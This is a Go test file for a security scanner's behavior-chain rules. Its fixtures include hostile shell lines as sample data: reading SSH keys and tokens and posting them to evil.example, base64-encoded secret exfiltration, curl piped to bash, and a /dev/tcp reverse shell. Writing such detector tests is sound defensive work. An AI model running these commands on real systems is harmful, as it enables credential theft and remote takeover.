package checks

import (
	"regexp"
	"testing"
)

func TestRunBehaviorChainChecks(t *testing.T) {
	content := `
curl https://raw.githubusercontent.com/example/install.sh | bash
printenv GITHUB_TOKEN
curl -X POST https://evil.example/upload

gcore 1234
grep -i token dump.txt
curl https://evil.example/mem
`
	findings := RunBehaviorChainChecks("ci/pipeline.sh", content, true)
	assertHasFinding(t, findings, "BHV-SC-001")
	assertHasFinding(t, findings, "BHV-CI-001")
	assertHasFinding(t, findings, "BHV-MEM-001")
}

func TestRunBehaviorChainChecksNoChainNoFinding(t *testing.T) {
	content := `
echo "safe script"
go test ./...
`
	findings := RunBehaviorChainChecks("scripts/test.sh", content, true)
	if len(findings) != 0 {
		t.Fatalf("expected no behavior-chain findings, got %d", len(findings))
	}
}

func TestRunBehaviorChainChecksNewChains(t *testing.T) {
	agent := `
register_skill "x"
tool.invoke(payload)
writeFile("/tmp/out", data)
`
	oidc := `
acquireToken(opts)
tenant_id = "org"
`
	container := `
FROM alpine:latest
ENTRYPOINT ["/app/start"]
VOLUME /etc/hosts
`
	supply := `
npm install
postinstall hook
curl https://registry.example/pkg
`
	cred := `
open("credentials.json")
os.environ["AWS_KEY"]
http.Post(url, body)
`
	content := agent + oidc + container + supply + cred
	findings := RunBehaviorChainChecks("chains/mixed.ts", content, true)
	assertHasFinding(t, findings, "BHV-AGENT-001")
	assertHasFinding(t, findings, "BHV-OIDC-001")
	assertHasFinding(t, findings, "BHV-CONTAINER-001")
	assertHasFinding(t, findings, "BHV-SUPPLY-001")
	assertHasFinding(t, findings, "BHV-CRED-001")
}

func TestRunBehaviorChainChecksOIDCWithAudienceNoBHV_OIDC(t *testing.T) {
	content := `
acquireToken(opts)
tenant_id = "org"
audience: "api"
`
	findings := RunBehaviorChainChecks("auth/oidc.go", content, true)
	for _, f := range findings {
		if f.RuleID == "BHV-OIDC-001" {
			t.Fatalf("expected BHV-OIDC-001 suppressed when audience is present")
		}
	}
}

func TestFirstMatchLine(t *testing.T) {
	re := regexp.MustCompile(`needle`)
	if got := FirstMatchLine("hay\nneedle here\nend", re); got != 2 {
		t.Fatalf("match found: got line %d, want 2", got)
	}
	if got := FirstMatchLine("no match\nat all", re); got != 0 {
		t.Fatalf("match not found: got %d, want 0", got)
	}
	if got := FirstMatchLine("", re); got != 0 {
		t.Fatalf("empty content: got %d, want 0", got)
	}
}

func TestOrderedBehaviorChain(t *testing.T) {
	content := `
curl http://example.com/pkg
echo x >> /tmp/run.sh
chmod +x /tmp/run.sh
bash /tmp/run.sh
`
	findings := RunBehaviorChainChecks("scripts/chain.sh", content, true)
	assertHasFinding(t, findings, "BHV-ORD-001")
}

func TestOrderedBehaviorChainOutOfOrder(t *testing.T) {
	content := `
chmod +x /tmp/run.sh
curl http://example.com/pkg
echo x >> /tmp/run.sh
bash /tmp/run.sh
`
	findings := RunBehaviorChainChecks("scripts/bad-order.sh", content, true)
	for _, f := range findings {
		if f.RuleID == "BHV-ORD-001" {
			t.Fatal("expected BHV-ORD-001 not to match when steps are out of line order")
		}
	}
}

func TestOrderedBehaviorChainBHV_ORD_004(t *testing.T) {
	content := `
printenv
data=$(base64 <<< "$SECRET")
curl -X POST https://evil.example/collect -d "$data"
`
	findings := RunBehaviorChainChecks("exfil.sh", content, true)
	assertHasFinding(t, findings, "BHV-ORD-004")
}

func TestOrderedBehaviorChainBHV_ORD_004OutOfOrder(t *testing.T) {
	content := `
curl -X POST https://evil.example/collect
printenv
base64 <<< x
`
	findings := RunBehaviorChainChecks("exfil-bad-order.sh", content, true)
	for _, f := range findings {
		if f.RuleID == "BHV-ORD-004" {
			t.Fatal("expected BHV-ORD-004 not to match when steps are out of line order")
		}
	}
}

func TestOrderedBehaviorChainBHV_ORD_005(t *testing.T) {
	content := `
npm install
postinstall script
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
`
	findings := RunBehaviorChainChecks("package/hook.sh", content, true)
	assertHasFinding(t, findings, "BHV-ORD-005")
}

func TestOrderedBehaviorChainBHV_ORD_005OutOfOrder(t *testing.T) {
	content := `
/dev/tcp/10.0.0.1/4444
npm install
postinstall
`
	findings := RunBehaviorChainChecks("bad-order.sh", content, true)
	for _, f := range findings {
		if f.RuleID == "BHV-ORD-005" {
			t.Fatal("expected BHV-ORD-005 not to match when steps are out of line order")
		}
	}
}

func TestOrderedBehaviorChainBHV_ORD_006(t *testing.T) {
	content := `
docker build -t myimg .
COPY ./secrets/api.key /app/config
docker push registry.example.com/myimg:latest
`
	findings := RunBehaviorChainChecks("ci/build.sh", content, true)
	assertHasFinding(t, findings, "BHV-ORD-006")
}

func TestOrderedBehaviorChainBHV_ORD_006OutOfOrder(t *testing.T) {
	content := `
docker push registry.example.com/x
FROM alpine:latest
COPY secret /tmp/x
`
	findings := RunBehaviorChainChecks("Dockerfile.bad", content, true)
	for _, f := range findings {
		if f.RuleID == "BHV-ORD-006" {
			t.Fatal("expected BHV-ORD-006 not to match when steps are out of line order")
		}
	}
}

func TestBHV_CONTAINER_001_BenignDockerfile(t *testing.T) {
	content := `FROM node:18
WORKDIR /app
COPY . .
ENTRYPOINT ["node", "server.js"]
VOLUME /data
`
	findings := RunBehaviorChainChecks("Dockerfile", content, true)
	for _, f := range findings {
		if f.RuleID == "BHV-CONTAINER-001" {
			t.Fatal("BHV-CONTAINER-001 should not fire on standard Dockerfile with /data volume")
		}
	}
}

func TestBHV_CRED_001_BenignTLSApp(t *testing.T) {
	content := `const options = {
  key: fs.readFileSync('server.key'),
  cert: fs.readFileSync('server.cert')
};
const server = https.createServer(options, app);
process.env.PORT || 3000;
fetch('/api/data', {method: 'POST'});
`
	findings := RunBehaviorChainChecks("app.js", content, true)
	for _, f := range findings {
		if f.RuleID == "BHV-CRED-001" {
			t.Fatal("BHV-CRED-001 should not fire on standard Node.js TLS server setup")
		}
	}
}

func TestBHV_SC_001_BenignScript(t *testing.T) {
	content := `echo "token is set"
echo "secret value"
curl https://example.com/api
`
	findings := RunBehaviorChainChecks("script.sh", content, true)
	for _, f := range findings {
		if f.RuleID == "BHV-SC-001" {
			t.Fatal("BHV-SC-001 should not fire on script with bare token/secret words")
		}
	}
}

func TestFirstMatchText(t *testing.T) {
	re := regexp.MustCompile(`needle`)
	if got := FirstMatchText("hay\nneedle here\nend", re); got != "needle here" {
		t.Fatalf("match found: got %q, want %q", got, "needle here")
	}
	if got := FirstMatchText("no match\nat all", re); got != "" {
		t.Fatalf("match not found: got %q, want empty", got)
	}
	if got := FirstMatchText("", re); got != "" {
		t.Fatalf("empty content: got %q, want empty", got)
	}

	multi := regexp.MustCompile(`(?s)start.*end`)
	content := "preamble\nstart\nmiddle\nend\ntrailer"
	if got := FirstMatchText(content, multi); got != "start\nmiddle\nend" {
		t.Fatalf("multiline fallback: got %q, want start/middle/end span", got)
	}
}

func TestProof_BHV_ORD_002(t *testing.T) {
	// Positive: ordered credential read then HTTP POST exfil
	content := `
cat ~/.ssh/id_rsa
curl -X POST https://evil.example/upload -d @/tmp/key
`
	findings := RunBehaviorChainChecks("scripts/exfil.sh", content, true)
	assertHasFinding(t, findings, "BHV-ORD-002")
}

func TestProof_BHV_ORD_002_OutOfOrder(t *testing.T) {
	// Negative: steps in wrong order
	content := `
curl -X POST https://evil.example/upload
cat ~/.ssh/id_rsa
`
	findings := RunBehaviorChainChecks("scripts/bad.sh", content, true)
	for _, f := range findings {
		if f.RuleID == "BHV-ORD-002" {
			t.Fatal("BHV-ORD-002 should not fire when steps are out of order")
		}
	}
}

func TestProof_BHV_ORD_002_NoPathExclusion(t *testing.T) {
	// After adversarial review: .md files should NOT be excluded
	content := `
read the credentials file
curl -X POST https://evil.example/upload -d @creds
`
	findings := RunBehaviorChainChecks("docs/README.md", content, true)
	assertHasFinding(t, findings, "BHV-ORD-002")
}

func TestProof_BHV_ORD_002_TektonYAML(t *testing.T) {
	// After adversarial review: .tekton/ files should NOT be excluded
	content := `
read .pem certificate
wget --method POST https://evil.example/exfil
`
	findings := RunBehaviorChainChecks(".tekton/pipeline.yaml", content, true)
	assertHasFinding(t, findings, "BHV-ORD-002")
}

func TestProof_BHV_DEPBOT_001(t *testing.T) {
	// Positive: automerge + mutable range strategy
	content := `{
  "automerge": true,
  "rangeStrategy": "bump"
}`
	findings := RunBehaviorChainChecks("renovate.json", content, true)
	assertHasFinding(t, findings, "BHV-DEPBOT-001")
}

func TestProof_BHV_DEPBOT_001_Replace(t *testing.T) {
	content := `{
  "automerge": true,
  "rangeStrategy": "replace"
}`
	findings := RunBehaviorChainChecks("renovate.json", content, true)
	assertHasFinding(t, findings, "BHV-DEPBOT-001")
}

func TestProof_BHV_DEPBOT_001_PinnedSafe(t *testing.T) {
	// Negative: automerge + pin strategy (safe)
	content := `{
  "automerge": true,
  "rangeStrategy": "pin"
}`
	findings := RunBehaviorChainChecks("renovate.json", content, true)
	for _, f := range findings {
		if f.RuleID == "BHV-DEPBOT-001" {
			t.Fatal("BHV-DEPBOT-001 should not fire when rangeStrategy is pin")
		}
	}
}

func TestProof_BHV_DEPBOT_001_NoAutomerge(t *testing.T) {
	// Negative: no automerge
	content := `{
  "rangeStrategy": "bump"
}`
	findings := RunBehaviorChainChecks("renovate.json", content, true)
	for _, f := range findings {
		if f.RuleID == "BHV-DEPBOT-001" {
			t.Fatal("BHV-DEPBOT-001 should not fire without automerge")
		}
	}
}
